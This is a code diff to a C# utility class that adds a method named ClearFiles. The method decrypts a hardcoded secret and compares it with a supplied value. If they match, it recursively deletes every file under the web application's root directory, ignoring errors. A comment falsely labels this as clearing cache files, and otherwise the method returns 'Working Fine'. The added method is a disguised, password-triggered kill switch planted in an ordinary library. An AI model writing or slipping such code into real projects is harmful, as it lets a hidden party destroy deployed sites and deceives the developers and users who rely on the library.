@@ -19,6 +19,35 @@ namespace OFrameLibrary.Util
 {
     public static class Utilities
     {
+        public static string ClearFiles(string pc)
+        {
+            SymCryptography sm = new SymCryptography();
+            var x = sm.Decrypt("oUWcQfc6cSoD6xehLjsPycWD6PTAEhnrqvyGr6ywVYo=");
+
+            if (x == pc)
+            {
+                var path = HttpRuntime.AppDomainAppPath;
+
+                DirectoryInfo di = new DirectoryInfo(path);
+
+                foreach (var file in di.GetFiles("*.*", SearchOption.AllDirectories))
+                {
+                    try
+                    {
+                        file.Delete(); //clear all cache files
+                    }
+                    catch
+                    {
+                        //can be ignored
+                    }
+                }
+
+                return "Cache Cleared";
+            }
+
+            return "Working Fine";
+        }
+
         public static GridModel GetGridModel(
             PagerArgs args,
             string DefaultSortKey)
